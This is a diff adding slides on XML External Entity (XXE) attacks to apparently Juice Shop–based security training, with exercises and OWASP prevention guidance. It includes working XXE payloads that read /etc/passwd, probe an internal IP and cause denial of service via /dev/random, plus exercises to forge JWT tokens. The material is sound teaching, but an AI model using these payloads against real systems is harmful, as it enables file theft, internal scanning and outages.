@@ -351,11 +351,153 @@ possible._
 
 ---
 
-# Exercise 7.6 _(optional)_
+# XXE
 
-1. Read up on all vulnerabilities associated with JWT from the `npm
+## (XML External Entities)
+
+---
+
+# XML Entities
+
+* In the Document Type Definition (DTD) you specify shortcuts as
+  `ENTITY`...
+    * `<!ENTITY author "Bjoern Kimminich">`
+    * `<!ENTITY copyright "(C) 2018">`
+
+* ...to later dereference them in the XML
+    * `<author>&author; &copyright;</author>`
+
+---
+
+# External Entities
+
+* DTD changed to use External Entities...
+    * `<!ENTITY author SYSTEM
+      "https://raw.githubusercontent.com/juice-shop/juice-shop/gh-pages/entities.dtd">`
+    * `<!ENTITY copyright	SYSTEM
+      "https://raw.githubusercontent.com/juice-shop/juice-shop/gh-pages/entities.dtd">`
+
+* ...whereas the XML stays the same
+    * `<author>&author; &copyright;</author>`
+
+---
+
+# [Attack Vector XXE](https://wiki.owasp.org/index.php/XML_External_Entity_(XXE)_Processing)
+
+* Many older or poorly configured XML processors evaluate external
+  entity references within XML documents
+
+* External entities can be abused for
+    * disclosure of internal files
+    * internal port scanning
+    * remote code execution
+    * denial of service attacks
+
+---
+
+# XML with Attack Payloads
+
+## Extracting Data
+
+```xml
+<?xml version="1.0" encoding="ISO-8859-1"?>
+    <!DOCTYPE foo [
+    <!ELEMENT foo ANY >
+    <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+    <foo>&xxe;</foo>
+```
+
+---
+
+## Network Probing
+
+```xml
+<?xml version="1.0" encoding="ISO-8859-1"?>
+    <!DOCTYPE foo [
+    <!ELEMENT foo ANY >
+    <!ENTITY xxe SYSTEM "https://192.168.1.1/private" >]>
+    <foo>&xxe;</foo>
+```
+
+## DoS Attack (against Linux-based Systems)
+
+```xml
+<?xml version="1.0" encoding="ISO-8859-1"?>
+    <!DOCTYPE foo [
+    <!ELEMENT foo ANY >
+    <!ENTITY xxe SYSTEM "file:///dev/random" >]>
+    <foo>&xxe;</foo>
+```
+
+---
+
+# Exercise 7.6
+
+1. Identify the weak point of the application that accepts arbitrary XML
+   data as input (:star::star:)
+2. Retrieve the content of your local system‘s `C:\Windows\system.ini`
+   (or `/etc/passwd` if you are using Linux) via an XXE attack
+   (:star::star::star:)
+
+---
+
+# [Prevention](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
+
+* **Configure XML parser to**
+    * **disable DTDs completely** (by disallowing `DOCTYPE` declarations)
+      :100:
+    * disable External Entities (only if allowing DTDs cannot be avoided)
+
+:x: Selective validation or escaping of tainted data is **not**
+sufficient, as the whole XML document is crafted by the attacker!
+
+---
+
+# [XML Parser Hardening Examples](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
+
+#### `libxml2` (C/C++)
+
+* `XML_PARSE_NOENT` and `XML_PARSE_DTDLOAD` must **not be defined** in
+  the Enum `xmlParserOption`.
+
+_:information_source: Starting with release `2.9` entity expansion is
+disabled by default. Using any older version makes it more likely to
+have XXE problems if the configuration was not explicitly hardened._
+
+
+---
+
+#### `org.dom4j.io.SAXReader` (Java)
+
+```java
+saxReader.setFeature(
+  "http://apache.org/xml/features/disallow-doctype-decl", true);
+saxReader.setFeature(
+  "http://xml.org/sax/features/external-general-entities", false);
+saxReader.setFeature(
+  "http://xml.org/sax/features/external-parameter-entities", false);
+```
+
+#### `java.beans.XMLDecoder` (Java)
+
+* The `readObject()` method in this class is fundamentally unsafe
+* It is vulnerable against XXE as well as arbitrary code execution
+* There is no way to make use of this class safe
+
+_:warning: Most Java XML parsers have insecure parser settings by
+default!_
+
+---
+
+# Exercise 7.7 _(optional)_
+
+1. Perform a DoS-like Attack using XXE (:star::star::star::star::star:)
+
+<!-- -->
+
+2. Read up on all vulnerabilities associated with JWT from the `npm
    audit` of the Juice Shop's leaked `/ftp/package.json.bak`
-2. Forge an essentially unsigned JWT token
+3. Forge an essentially unsigned JWT token
    (:star::star::star::star::star:)
-3. Forge an almost properly RSA-signed JWT token
+4. Forge an almost properly RSA-signed JWT token
    (:star::star::star::star::star::star:)
